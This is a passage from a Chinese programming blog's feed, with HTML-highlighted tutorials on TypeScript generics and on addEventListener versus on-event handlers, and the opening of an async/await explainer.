class="token constant">T</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> arg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 普通数组类型都具有该方法</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>类型变量也可以使用其他字母或者单词（通常使用 T），并且可以同时定义多个变量：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token generic-function"><span class="token function">fn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">M</span><span class="token punctuation">,</span> My<span class="token punctuation">,</span> other<span class="token operator">></span></span></span><span class="token punctuation">(</span>arg<span class="token operator">:</span> <span class="token constant">M</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token constant">M</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> one<span class="token operator">:</span> My<span class="token punctuation">;</span>  <span class="token keyword">let</span> two<span class="token operator">:</span> other<span class="token punctuation">;</span>  <span class="token keyword">return</span> arg<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 存在多个类型变量时，需要依次赋值类型</span><span class="token generic-function"><span class="token function">fn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">number</span><span class="token punctuation">,</span> <span class="token builtin">boolean</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>除了函数，泛型也可以在接口中使用，例如：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">interface</span> <span class="token class-name">IGeneric</span> <span class="token punctuation">&#123;</span>  <span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span><span class="token punctuation">(</span>arg<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> fn<span class="token operator">:</span> <span class="token function-variable function">IGeneric</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> arg<span class="token punctuation">;</span>  <span class="token comment">// 和接口申明不一致会报错</span>  <span class="token comment">// return arg + '';</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者是针对整个接口的泛型：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">interface</span> <span class="token class-name">IGeneric<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span> <span class="token punctuation">&#123;</span>  a<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">;</span>  b<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">c</span><span class="token punctuation">(</span>arg<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> obj<span class="token operator">:</span> IGeneric<span class="token operator">&lt;</span><span class="token builtin">number</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  a<span class="token operator">:</span> <span class="token number">123</span><span class="token punctuation">,</span>  b<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token function-variable function">c</span><span class="token operator">:</span> <span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">=></span> arg <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><p>针对类定义类型变量时，类的所有非静态成员都可以使用该变量：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">class</span> <span class="token class-name"><span class="token constant">CS</span><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span> <span class="token punctuation">&#123;</span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token keyword">public</span> attr<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token constant">T</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>attr<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 静态成员不能使用泛型类型</span>  <span class="token comment">// static a: T = ''; // Error</span><span class="token punctuation">&#125;</span><span class="token comment">// 实例化时传入类型值</span><span class="token keyword">const</span> cs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token constant">CS</span><span class="token operator">&lt;</span><span class="token builtin">number</span><span class="token operator">></span></span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cs<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h2><p>在一些场景中，可能并不期望类型变量的值太<strong>泛</strong>，而是需要具有某些属性或方法，这时就可以使用 <code>extends</code> 关键字对类型加一些<strong>约束</strong>，这和类中的<strong>继承</strong>用途也有些类似；例如：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">interface</span> <span class="token class-name">IObj</span> <span class="token punctuation">&#123;</span>  length<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 将参数约束为具有 length 属性的任意类型</span><span class="token keyword">function</span> <span class="token generic-function"><span class="token function">fn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span> <span class="token keyword">extends</span> IObj<span class="token operator">></span></span></span><span class="token punctuation">(</span>arg<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">number</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> arg<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span class="token comment">// 报错，因为数字没有 length 属性</span><span class="token comment">// fn(123); // Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合其他 ts 特性，也能表示一些特殊情形，比如下例表示函数第二个参数，需要是第一个参数对象的属性名之一，<code>keyof</code> 关键字为索引查询操作符，<code>keyof T</code> 表示 <code>T</code> 的所有属性构成的联合类型：</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">function</span> <span class="token generic-function"><span class="token function">fn</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token punctuation">,</span> <span class="token constant">K</span> <span class="token keyword">extends</span> <span class="token keyword">keyof</span> <span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>obj<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">,</span> key<span class="token operator">:</span> <span class="token constant">K</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> a<span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 报错，因为第一个参数对象中并没有一个叫 'b' 的属性</span><span class="token comment">// fn(&#123; a: 1 &#125;, 'b'); // Error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ts typescript 泛型 generic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>addEventListener 方法与 on 事件的区别</title>
      <link href="/2024/09/27/javascript/addeventlistener-fang-fa-yu-on-shi-jian-de-qu-bie/"/>
      <url>/2024/09/27/javascript/addeventlistener-fang-fa-yu-on-shi-jian-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<h1 id="on事件"><a href="#on事件" class="headerlink" title="on事件"></a>on事件</h1><p>Javascript中可以对一些页面的事件设定触发值，例如常用的点击 <code>onclick</code>，鼠标移动 <code>onmousemove</code>，或者移动端屏幕点击 <code>ontouchstart</code>，其它类似的还有 <code>onmousedown</code>, <code>onmouseup</code>, <code>onchange</code>, <code>onfocus</code>, <code>onmouseenter</code>, <code>ontouchmove</code>, <code>ontouchend</code> 等等，可以对其设定值来实现事件触发后执行的操作，例如：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击后就会弹出提示框，也可以这样写：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;h1 onclick=(function()&#123;alert("hello");&#125;)()>Click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样也能实现同样效果，只是它的值变成了一个匿名函数。</p><h1 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener()方法"></a>addEventListener()方法</h1><p>这个方法设定一个事件监听器，当某一事件发生通过设定的参数执行操作。语法是：</p><p><code>addEventListener(event, function, useCapture)</code></p><ul><li>参数 <code>event</code> 是必须的，表示监听的事件，例如 <code>click</code>, <code>touchstart</code> 等，就是之前<strong>不加前缀</strong> <code>on</code> 的事件。</li><li>参数 <code>function</code> 也是必须的，表示事件触发后调用的函数，可以是外部定义函数，也可以是匿名函数。</li><li>参数 <code>useCapture</code> 是选填的，填<code>true</code>或者<code>false</code>，用于描述事件是<strong>冒泡</strong>还是**捕获，<code>true</code>表示捕获，默认的<code>false</code>表示冒泡。</li></ul><h2 id="移除事件监听"><a href="#移除事件监听" class="headerlink" title="移除事件监听"></a>移除事件监听</h2><p>如果要移除 addEventListener() 添加的事件监听，就要使用**removeEventListener()**，语法是：</p><p><code>removeEventListener(event, function)</code></p><p>参数与addEventListener()一致。</p><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p><strong>IE 8</strong>及更早的版本，和<strong>Opera 7.0</strong>及更早的版本，不支持 addEventListener() 和 removeEventListener() 方法，他们使用的是一下方法代替：</p><p>添加事件：<br><code>attachEvent(event, function)</code></p><p>移除事件：<br><code>detachEvent(event, function)</code></p><p>可以用以下方法解决兼容性问题：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"div1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>div1<span class="token punctuation">.</span>addEventListener<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>div1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"your browser is compatible with addEventListener!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>div1<span class="token punctuation">.</span>attachEvent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>div1<span class="token punctuation">.</span><span class="token function">attachEvent</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"your browser is not compatible with addEventListener!"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="冒泡与捕获"><a href="#冒泡与捕获" class="headerlink" title="冒泡与捕获"></a>冒泡与捕获</h2><p>这个参数设置的是元素事件的<strong>触发顺序</strong>，即页面中某元素设置了事件监听，其内部元素也设置有事件监听，<strong>冒泡</strong>是先触发最内部元素的事件，再依次触发外一层元素的事件，<strong>捕获</strong>刚好相反，由外到内依次触发。</p><p>综合举例：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>child1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span>200px<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span>#0cc</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>冒泡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parent2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>child2<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span>200px<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span>#0cc</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>捕获<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> parent1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"parent1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"child1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> parent2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"parent2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"child2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>parent1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"this is parent element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>child1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"this is child element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>parent2<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"this is parent element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>child2<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"this is child element"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>点击“冒泡”模块，先提示子元素后提示父元素；点击“捕获”模块，由于同时设置为 <code>true</code>，先提示父元素后提示子元素。</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>为某元素设定事件触发函数时，可能会觉得addEventListener和on事件的功能差不多，但是，addEventListener除了可以设置元素<strong>触发顺序</strong>外，还能<strong>多次绑定事件</strong>，因为 on 事件多次绑定的话会出现<strong>覆盖</strong>。</p><p>举例说明：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span>200px<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span>#0cc</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> dib1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"div1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>div1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"message1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>div1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"message2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果会依次提示“message1”，“message2“。</p><p>但是js这么写的话：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">div1<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"message1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>div1<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"message2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就只会提示最后一个“message2”，因为onclick作为对象div1的一个属性，第二次对其进行赋值就会<strong>覆盖</strong>之前的函数值，这样on事件在某些场合就不适用了。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> addeventlistener onclick 事件监听 冒泡捕获 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async 与 await 的用法详解</title>
      <link href="/2024/09/27/javascript/async-yu-await-de-yong-fa-xiang-jie/"/>
      <url>/2024/09/27/javascript/async-yu-await-de-yong-fa-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="async"><a href="#async" class="headerlink" title="async"></a>async</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>用于声明异步函数，返回值为一个 <code>Promise</code> 对象，它以类似 <strong>同步</strong> 的方式来写异步方法，语法与声明函数类似，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello world!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Promise()</span><span class="token comment">// 这里证明其返回值为一个 Promise 对象；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>也许这里会有疑问，返回值是 Promise 对象，那么函数本身定义的返回值跑到哪里去了呢？其实，熟悉 Promise 的就知道其异步结果是通过 <code>.then()</code> 或者 <code>.catch()</code> 方法来获取并进行进一步处理的，这样一个道理，定义的异步函数中的返回值会当成 <code>resolve</code> 状态来处理，一般用 <code>.then()</code> 方法处理，而如果定义的异步函数抛出错误，例如变量未定义，则会被当做 <code>reject</code> 状态来处理，一般使用 <code>.catch()</code> 方法来处理；</p><p>举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 使用 .then() 的情况</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">'Hello world!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Hello world!</span><span class="token comment">// 使用 .catch() 的情况</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里的变量 aaa 未定义，为了制造错误</span><span class="token punctuation">&#125;</span><span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ReferenceError: aaa is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假如是既有返回值，又有错误的话，来看看结果如何：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// aaa 依然未定义；</span>    <span class="token keyword">return</span> <span class="token string">'Hello world!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span 